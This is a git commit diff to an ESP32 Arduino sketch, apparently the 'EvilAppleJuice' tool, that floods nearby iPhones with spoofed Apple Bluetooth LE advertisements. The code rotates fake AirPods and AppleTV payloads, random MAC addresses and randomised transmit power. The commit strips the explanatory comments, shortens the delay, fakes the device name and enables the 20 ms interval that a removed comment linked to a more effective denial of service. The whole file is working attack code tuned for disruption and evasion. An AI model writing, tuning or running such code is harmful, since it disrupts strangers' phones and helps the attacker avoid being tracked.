9587c1fdb13c20e6dcc0504a426465167c652ddb
tysen. <tysen@tutanota.de>
2024-09-22 22:23:54 -0400

    Updated EvilAppleJuice-ESP32-INO.ino
    Updated to maximize latest iOS compatibility

--- src/EvilAppleJuice-ESP32-INO/EvilAppleJuice-ESP32-INO.ino
+++ src/EvilAppleJuice-ESP32-INO/EvilAppleJuice-ESP32-INO.ino
@@ -1,28 +1,20 @@
-// This example takes heavy inpsiration from the ESP32 example by ronaldstoner
-// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10
-// See the README for more info
 #include <Arduino.h>
 #include <BLEDevice.h>
 #include <BLEUtils.h>
 #include <BLEServer.h>
 #include <esp_arduino_version.h>
 
-// Bluetooth maximum transmit power
 #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
+#define MAX_TX_POWER ESP_PWR_LVL_P21
 #elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
-#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
+#define MAX_TX_POWER ESP_PWR_LVL_P20
 #else
-#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
+#define MAX_TX_POWER ESP_PWR_LVL_P9
 #endif
 
-BLEAdvertising *pAdvertising;  // global variable
-uint32_t delayMilliseconds = 1000;
+BLEAdvertising *pAdvertising;
+uint32_t delayMilliseconds = 200;
 
-/*
-  These are audio devices: wireless headphones / earbuds
-  It seems these need a shorter range between ESP & iDevice
-*/
 const uint8_t DEVICES[][31] = {
   // Airpods
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
@@ -60,10 +52,6 @@ const uint8_t DEVICES[][31] = {
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
 };
 
-/*
-  These are more general home devices
-  It seems these can work over long distances, especially AppleTV Setup
-*/
 const uint8_t SHORT_DEVICES[][23] = {
   // AppleTV Setup
   {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
@@ -95,33 +83,27 @@ const uint8_t SHORT_DEVICES[][23] = {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting ESP32 BLE");
+  Serial.println("Starting ESP32...");
 
-  BLEDevice::init("AirPods 69");
+  BLEDevice::init("iPhone 16 Pro Max");
 
-  // Increase the BLE Power to 21dBm (MAX)
-  // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
+  randomSeed(analogRead(0));
+  
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
   
-  // Create the BLE Server
   BLEServer *pServer = BLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
 
-  // seems we need to init it with an address in setup() step.
   esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
   pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
 }
 
 void loop() {
 
-  // First generate fake random MAC
   esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   for (int i = 0; i < 6; i++){
     dummy_addr[i] = random(256);
 
-    // It seems for some reason first 4 bits
-    // Need to be high (aka 0b1111), so we 
-    // OR with 0xF0
     if (i == 0){
       dummy_addr[i] |= 0xF0;
     }
@@ -129,42 +111,26 @@ void loop() {
 
   BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
 
-  // Randomly pick data from one of the devices
-  // First decide short or long
-  // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
-  int device_choice = random(2);
-  if (device_choice == 0){
-    int index = random(17);
+int device_choice = random(2);
+if (device_choice == 0) {
+     int index = random(13);
     #ifdef ESP_ARDUINO_VERSION_MAJOR
-      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
-      #else
-          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
-      #endif
+        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+            oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
+        #else
+            oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+        #endif
     #endif
-  } else {
-    int index = random(13);
+} else {
+  int index = random(17);
     #ifdef ESP_ARDUINO_VERSION_MAJOR
-      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-          oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
-      #else
-          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
-      #endif
+        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+            oAdvertisementData.addData(String((char*)DEVICES[index], 31));
+        #else
+            oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
+        #endif
     #endif
-  }
-
-  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
-      the three advertising PDU types when you want to connect to Apple devices.
-          // 0 = ADV_TYPE_IND, 
-          // 1 = ADV_TYPE_SCAN_IND
-          // 2 = ADV_TYPE_NONCONN_IND
-      
-      Randomly using any of these PDU types may increase detectability of spoofed packets. 
-
-      What we know for sure:
-      - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
-                        Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
-  */
+}
 
   int adv_type_choice = random(3);
   if (adv_type_choice == 0){
@@ -175,39 +141,30 @@ void loop() {
     pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
   }
 
-  // Set the device address, advertisement data
   pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
   pAdvertising->setAdvertisementData(oAdvertisementData);
 
-  // Set advertising interval
-  /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
-      an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
-      
-      These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
-  */
 
-  //pAdvertising->setMinInterval(0x20);
-  //pAdvertising->setMaxInterval(0x20);
-  //pAdvertising->setMinPreferred(0x20);
-  //pAdvertising->setMaxPreferred(0x20);
+  pAdvertising->setMinInterval(0x20);
+  pAdvertising->setMaxInterval(0x20);
+  pAdvertising->setMinPreferred(0x20);
+  pAdvertising->setMaxPreferred(0x20);
 
-  // Start advertising
   Serial.println("Sending Advertisement...");
   pAdvertising->start();
-  delay(delayMilliseconds); // delay for delayMilliseconds ms
+  delay(delayMilliseconds);
   pAdvertising->stop();
 
-  // Random signal strength increases the difficulty of tracking the signal
-  int rand_val = random(100);  // Generate a random number between 0 and 99
-  if (rand_val < 70) {  // 70% probability
+  int rand_val = random(100);
+  if (rand_val < 70) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-  } else if (rand_val < 85) {  // 15% probability
+  } else if (rand_val < 85) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
-  } else if (rand_val < 95) {  // 10% probability
+  } else if (rand_val < 95) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
-  } else if (rand_val < 99) {  // 4% probability
+  } else if (rand_val < 99) {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
-  } else {  // 1% probability
+  } else {
       esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
   }
 }
